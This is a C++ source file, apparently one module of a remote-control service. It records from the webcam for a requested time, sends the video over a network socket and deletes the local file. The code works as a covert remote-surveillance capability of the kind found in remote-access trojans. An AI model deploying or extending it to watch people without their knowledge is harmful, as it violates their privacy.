#include "../../lib/service.h"
#include <opencv2/opencv.hpp>
#include <string>
#include <vector>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <winsock2.h>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;
using namespace cv;

void record_video(SOCKET conn, int duration) {
    VideoCapture cap(0, CAP_DSHOW);
    if (!cap.isOpened()) {
        string error = "__ERROR__Cannot open webcam.";
        send(conn, error.c_str(), error.size(), 0);
        return;
    }

    int frame_width = 640;
    int frame_height = 480;
    cap.set(CAP_PROP_FRAME_WIDTH, frame_width);
    cap.set(CAP_PROP_FRAME_HEIGHT, frame_height);

    int fps = 20;
    vector<uchar> buffer;
    vector<Mat> frames;

    auto start = chrono::steady_clock::now();
    while (true) {
        Mat frame;
        cap >> frame;
        if (frame.empty()) break;

        frames.push_back(frame.clone());

        auto now = chrono::steady_clock::now();
        int elapsed = chrono::duration_cast<chrono::seconds>(now - start).count();
        if (elapsed >= duration) break;

        waitKey(1000 / fps);
    }

    cap.release();

    time_t now = time(nullptr);
    tm* local_time = localtime(&now);
    stringstream filename;
    filename << "video_" << put_time(local_time, "%Y%m%d_%H%M%S") << ".avi";

    VideoWriter writer(filename.str(), VideoWriter::fourcc('X', 'V', 'I', 'D'), fps, Size(frame_width, frame_height));
    for (const auto& frame : frames) {
        writer.write(frame);
    }
    writer.release();

    ifstream file(filename.str(), ios::binary);
    if (!file) {
        string error = "__ERROR__Failed to read video.";
        send(conn, error.c_str(), error.size(), 0);
        return;
    }

    string header = "__VIDEO__";
    send(conn, header.c_str(), header.size(), 0);

    char chunk[4096];
    while (file.read(chunk, sizeof(chunk)) || file.gcount() > 0) {
        send(conn, chunk, file.gcount(), 0);
    }

    file.close();
    remove(filename.str().c_str());
}